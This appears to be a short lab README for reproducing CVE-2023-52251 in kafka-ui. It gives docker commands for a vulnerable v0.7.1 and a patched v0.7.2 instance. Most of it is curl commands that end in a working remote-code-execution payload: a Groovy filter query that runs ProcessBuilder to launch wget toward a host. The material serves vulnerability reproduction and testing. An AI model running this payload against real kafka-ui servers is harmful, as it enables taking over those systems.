# vulnerable kafka-ui version
```bash
KAFKA_UI_VERSION=v0.7.1 docker compose -p kafka-ui-vulnerable up
```
## steps to reproduce CVE-2023-52251
```bash
# create a topic
curl -X POST http://127.0.0.1:8091/api/clusters/local/topics \
-H "Content-Type: application/json" \
-d '{"name":"topic","partitions":1,"configs":{"cleanup.policy":"delete","retention.bytes":"-1"}}'

# create a message
curl -X POST http://127.0.0.1:8091/api/clusters/local/topics/topic/messages \
-H "Content-Type: application/json" \
-d '{"partition":0,"key":"123","content":"123","keySerde":"String","valueSerde":"String"}'

# create a filter with RCE payload 
curl -G "http://127.0.0.1:8091/api/clusters/local/topics/topic/messages" \
--data-urlencode "q=new ProcessBuilder(\"wget\",\"host\").start()" \
--data-urlencode "filterQueryType=GROOVY_SCRIPT"
```
# secure kafka-ui against CVE-2023-52251
```bash
KAFKA_UI_VERSION=v0.7.2 docker compose -p kafka-ui-secure up 
```